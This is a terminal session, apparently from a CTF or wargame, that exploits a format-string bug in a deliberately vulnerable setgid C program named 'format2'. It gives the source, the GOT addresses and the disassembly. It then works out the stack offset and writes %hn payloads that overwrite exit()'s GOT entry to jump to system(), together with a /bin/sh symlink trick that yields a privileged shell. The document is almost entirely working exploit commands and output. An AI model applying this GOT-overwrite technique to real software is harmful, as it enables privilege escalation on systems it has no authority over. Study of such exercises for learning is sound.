root@kali32:~$ cat format2.c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void be_nice_to_people() {
    // /bin/sh is usually symlinked to bash, which usually drops privs. Make
    // sure we don't drop privs if we exec bash, (ie if we call system()).
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, const char **argv) {
    be_nice_to_people();
    char buf[80];
    snprintf(buf, 70, argv[1]);
    printf(buf);
    printf("\n");
    system("/bin/ls");
    exit(0);
}

# Got entries
root@kali32:~$ objdump -R format2

format2:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   printf
0804a004 R_386_JUMP_SLOT   getegid
0804a008 R_386_JUMP_SLOT   system
0804a00c R_386_JUMP_SLOT   __gmon_start__
0804a010 R_386_JUMP_SLOT   exit
0804a014 R_386_JUMP_SLOT   __libc_start_main
0804a018 R_386_JUMP_SLOT   snprintf
0804a01c R_386_JUMP_SLOT   putchar
0804a020 R_386_JUMP_SLOT   setresgid

# Finding number of the format string
root@kali32:~$ ./format2 "AAAA %x %x %x %x %x %x %x %x %x"
AAAA 0 bf9188a4 bf918818 bf918810 bf918904 b775e930 0 c2 41414141

root@kali32:~$ ./format2 $(python -c 'print "AAAA" + "%9$x"')
AAAA41414141

root@kali32:~$ ./format2 $(python -c 'from pwn import *; print p32(0x41414141) + "%9$p"')
AAAA0x41414141

# Disassemble
root@kali32:~$ objdump -M intel -d format2
...
 804852d:       55                      push   ebp
 804852e:       89 e5                   mov    ebp,esp
 8048530:       83 e4 f0                and    esp,0xfffffff0
 8048533:       83 c4 80                add    esp,0xffffff80
 8048536:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 8048539:       89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
 804853d:       65 a1 14 00 00 00       mov    eax,gs:0x14
 8048543:       89 44 24 7c             mov    DWORD PTR [esp+0x7c],eax
 8048547:       31 c0                   xor    eax,eax
 8048549:       e8 b6 ff ff ff          call   8048504 <be_nice_to_people>
 804854e:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 8048552:       83 c0 04                add    eax,0x4
 8048555:       8b 00                   mov    eax,DWORD PTR [eax]
 8048557:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 804855b:       c7 44 24 04 46 00 00    mov    DWORD PTR [esp+0x4],0x46
 8048562:       00
 8048563:       8d 44 24 2c             lea    eax,[esp+0x2c]
 8048567:       89 04 24                mov    DWORD PTR [esp],eax
 804856a:       e8 b1 fe ff ff          call   8048420 <snprintf@plt>
 804856f:       8d 44 24 2c             lea    eax,[esp+0x2c]
 8048573:       89 04 24                mov    DWORD PTR [esp],eax
 8048576:       e8 45 fe ff ff          call   80483c0 <printf@plt>
 804857b:       c7 04 24 0a 00 00 00    mov    DWORD PTR [esp],0xa
 8048582:       e8 a9 fe ff ff          call   8048430 <putchar@plt>
 8048587:       c7 04 24 70 86 04 08    mov    DWORD PTR [esp],0x8048670
 804858e:       e8 4d fe ff ff          call   80483e0 <system@plt>
 8048593:       c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
 804859a:       e8 61 fe ff ff          call   8048400 <exit@plt>
 804859f:       90                      nop
...

# Overwriting exit() plt, examining the state of the stack
$ ruby formatter.rb 9:0x0804a010:0x44444444
python -c 'print "\x12\xa0\x04\x08"+"\x10\xa0\x04\x08"+"%9$17468x%9$hn%10$0x%10$hn"'

root@kali32:~$ ulimit -c unlimited

root@kali32:~$ ./format2 $(python -c 'print "\x12\xa0\x04\x08"+"\x10\xa0\x04\x08"+"%9$17468x%9$hn%10$0x%10$hn"')
Segmentation fault (core dumped)

root@kali32:~$ gdb -q ./format2 core
Reading symbols from ./format2...(no debugging symbols found)...done.
[New LWP 5798]
Core was generated by `./format2 %9$17468x%9$hn%10$0x%10$hn'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x4444444b in ?? ()

gdb-peda$ x /xw $esp
0xbfb8632c:     0x0804859f

gdb-peda$ x /i 0x0804859f
   0x804859f:   nop
gdb-peda$
   0x80485a0 <__libc_csu_init>: push   ebp
gdb-peda$
   0x80485a1 <__libc_csu_init+1>:       push   edi
gdb-peda$
   0x80485a2 <__libc_csu_init+2>:       push   esi
gdb-peda$
   0x80485a3 <__libc_csu_init+3>:       push   ebx
gdb-peda$
   0x80485a4 <__libc_csu_init+4>:       call   0x8048612 <__i686.get_pc_thunk.bx>

gdb-peda$ x /s 0x0804859f
0x804859f:      "\220UWVS\350i"

gdb-peda$ x /8bx 0x0804859f
0x804859f:      0x90    0x55    0x57    0x56    0x53    0xe8    0x69    0x00

# Using "\220UWVS\350i" as argument for system(), overwriting exit() plt
root@kali32:~$ ln -sf /bin/sh $(python -c 'print "\220UWVS\350i"')

# and jumping here:
 804858e:       e8 4d fe ff ff          call   80483e0 <system@plt>

$ ruby formatter.rb 9:0x0804a010:0x0804858e
python -c 'print "\x12\xa0\x04\x08"+"\x10\xa0\x04\x08"+"%9$2044x%9$hn%10$32138x%10$hn"'

root@kali32:~$ PATH=.:$PATH ./format2 $(python -c 'print "\x12\xa0\x04\x08"+"\x10\xa0\x04\x08"+"%9$2044x%9$hn%10$32138x%10$hn"')
